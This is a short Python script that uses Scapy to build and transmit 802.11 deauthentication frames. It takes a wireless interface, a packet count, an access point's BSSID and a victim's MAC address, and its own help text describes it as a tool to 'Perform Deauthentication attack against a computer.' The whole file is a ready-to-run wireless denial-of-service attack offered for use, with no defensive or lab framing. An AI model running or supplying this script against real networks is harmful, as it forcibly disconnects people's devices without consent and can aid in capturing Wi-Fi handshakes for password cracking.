from scapy.all import RadioTap, Dot11, sendp
from argparse import ArgumentParser as AP
from sys import exit

def deauth(
    iface: str,
    count: int,
    bssid: str,
    target_mac: str
    ):

    """
    - type=0 specifies that the frame we will be sending is 
      a management frame

    - subtype=12 specifies the type of management frame we want
      to send, which is a deauthentication frame , denoted by the number 12

    - addr1=target_mac specifies that this packet will go to the victim's computer

    - addr2=bssid specifies the MAC address of the source computer

    - addr3 specifies the MAC address of the access point which is equal to
      the source MAC address
    """
    dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=bssid, addr3=bssid)

    frame = RadioTap()/dot11

    # Tell Scapy to starting send deauthentication frames
    sendp(frame, iface=iface, count=count, inter=0.100)

if __name__ == "__main__":
    parser = AP(description="Perform Deauthentication attack against a computer")
    parser.add_argument("-i", "--interface",help="interface to send deauth packets from")
    parser.add_argument("-c", "--count",help="The number of deauthentication packets to send to the victim computer")
    parser.add_argument("-a", "--bssid",metavar="MAC",help="the MAC address of the access point (Airodump-ng BSSID)")
    parser.add_argument("-t", "--target-mac",metavar="MAC",help="the MAC address of the victim's computer (Airodump-ng Station)")

    args = parser.parse_args()

    if (not args.interface or not args.count 
        or not args.bssid or not args.target_mac):
        print("[-] Please specify all program arguments... run `sudo python3 deauthenticator.py -h` for help")
        exit(1)
    deauth(args.interface, args.count, args.bssid, args.target_mac)
    
